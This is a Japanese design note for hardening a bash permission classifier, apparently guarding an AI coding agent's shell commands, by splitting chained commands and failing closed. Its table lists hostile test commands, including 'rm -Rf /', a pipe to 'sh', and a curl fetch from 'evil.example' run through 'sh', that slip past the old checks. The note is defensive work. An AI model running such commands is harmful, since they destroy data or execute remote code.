# bash 許可判定をセグメント単位にし、失敗時は閉じる

## Objective

`classifyBashPermission` の auto-allow が、連結されたコマンドを検査せずに通してしまう穴を塞ぐ。
判定できない構文は `ask` に倒す（fail closed）。

## なぜ今これか

デッドコード掃除の過程で `knip` が `Unresolved imports: scripts/hooks/pre-bash-dev-server-block.js
-> ../lib/shell-split` を報告した。`scripts/lib/shell-split.js` は存在せず、当該フックは
ロード時に `Cannot find module` で落ちる。`settings.json` に未配線なので実行はされていない。

**その欠けているモジュールが、まさに今回の穴を塞ぐためのものだった** — `splitShellSegments`。

実測した挙動（`scripts/lib/permission-resolver.js` を直接叩いた結果）:

| コマンド | 判定 |
|---|---|
| `head -1 x; rm -Rf /` | **ALLOW** |
| `git status && rm -Rf ~/important` | **ALLOW** |
| `cat README.md \| sh` | **ALLOW** |
| `ls ; curl http://evil.example/x.sh \| sh` | **ALLOW** |
| `find . -type f -delete` | **ALLOW** |

`scripts/hooks/permission-request.js:43-46` は判定をそのまま `emitDecision` に渡すので、
**`allow` はプロンプトを出さずに実行される。**

原因は2つ:

1. **`SAFE_READONLY_BASH` が先頭トークンしか見ない。** `/^\s*cat(?:\s|$)/` は
   `cat x | sh` 全体に一致する。`;` `&&` `||` `|` の後ろは未検査
2. **`DANGEROUS_BASH` が大小文字を区別し、フラグの並びに依存する。**
   `BLOCKED_ACTION_PATTERNS` は `/i` を持つのに `DANGEROUS_BASH` は持たない。
   結果 `rm -Rf`（macOS の BSD rm で有効な書き方）が deny を外れる。
   `git push -f` も `--force` しか見ていないので外れる

2つが重なると、安全な先頭コマンドの後ろに危険なコマンドを繋ぐだけで無警告通過になる。

## Non-goals

- 完全なシェルパーサは書かない。目的は「安全と断定できない時に閉じる」ことであって、
  シェルの意味論を再現することではない
- `resolvePermission`（plan/workflow 由来のモード決定）は変えない。今回の穴は bash 判定側
- `hard-deny` の対象を増やさない。増やすと `ask` で足りるものまで止まり、迂回を誘発する

## 決定

1. **`scripts/lib/shell-split.js` を新設し、`splitShellSegments` を実装する。**
   引用符の内側を除いて `;` `&&` `||` `|` `\n` で分割する。壊れたフックが参照していた
   モジュール名と関数名をそのまま使う（そのフックは別途削除するが、名前は意図を表している）

2. **`classifyBashPermission` を全セグメントに適用し、最も厳しい結果を採る。**
   - どれか1つでも危険 → `deny`
   - 全部が safe-readonly → `allow`（readonly）
   - safe と audit-only のみ → `allow`（audit）
   - それ以外 → `ask`

3. **静的に読めない構文は `ask` に倒す。** コマンド置換 `$(...)` / バッククォート /
   プロセス置換 `<(...)` / `eval` / `exec` を含む場合、セグメント分割の結果を信用しない。
   **fail closed が既定。**

4. **危険判定をフラグ解析にする。** 正規表現の文字列一致をやめ、argv[0] のベース名と
   フラグ集合で判定する。大小文字と並び順に依存しない
   （`rm -Rf` `rm -fr` `rm -r -f` `rm --recursive --force` はすべて同じ扱い）

5. **auto-allow 側もフラグを見る。** `find` は `-delete` `-exec` `-execdir` `-ok` を取れる。
   読み取り専用として自動許可してよいのは、それらを持たない場合だけ。
   連結検査だけでは `find . -type f -delete` は単一セグメントなので素通りする

## 却下した案

| 案 | 却下の理由 |
|---|---|
| `DANGEROUS_BASH` に `/i` を足すだけ | 連結の穴が残る。`cat x \| sh` は危険パターンに一致しない |
| 連結を含むコマンドを一律 `deny` | `git status && npm test` のような正当な用法が止まり、迂回（1行ずつ実行）を誘発する |
| 本物のシェルパーサを導入 | 依存を増やす。判定できない時に閉じれば、精度は目的に足りる |
| `SAFE_READONLY_BASH` を `$` で終端させる | `ls -la` のような引数付きが落ちる。引数と連結は別の問題 |

## 触る対象

- **契約が変わる**: `classifyBashPermission` の入力単位が「コマンド全体」から
  「セグメント列」になる。戻り値の形は変えない（`behavior` / `policy_class` / `permission`）
- 新設: `scripts/lib/shell-split.js`
- 削除: `scripts/hooks/pre-bash-dev-server-block.js`（未配線・ロード時にクラッシュ・参照ゼロ）
- `knip.json` に `scripts/provider-adapters/**/*.js` を entry として宣言する
  （`pipeline-runner.js:390-426` が `--adapter-command` でパス指定して `spawnSync` する
  オペレータ用エントリポイント。未使用ではない）

## 数字

- 修正前の実測: 上表の5コマンドが `ALLOW`。修正後はいずれも `deny` または `ask`
- `hard-deny` の対象コマンド数は増やさない（判定方法だけ変える）

## 許容したリスク・負債

- **引用符の追跡は単純な状態機械。** ヒアドキュメントやネストした引用符は正確に扱えない。
  扱えない場合は分割結果を信用せず `ask` に倒すので、失敗方向は安全側
- **`ask` が増える。** `cat x | sh` のように以前 `allow` だったものが `ask` になる。
  プロンプトの頻度が上がるのは意図した対価

## Open Issues

- `AUDIT_ONLY_BASH` の `ps` / `id` / `whoami` はセグメント単位でも情報開示の観点では低リスクと
  みなしているが、`ps aux | grep secret` のような組み合わせは評価していない（推定：低リスク）
- `SAFE_READONLY_BASH` の他のコマンドにも同種の抜けがあるか未評価（推定: `sed -n` は
  `-i` を併用されると書き込みになるが、パターンが `-n` を要求しているので現状は防げている）
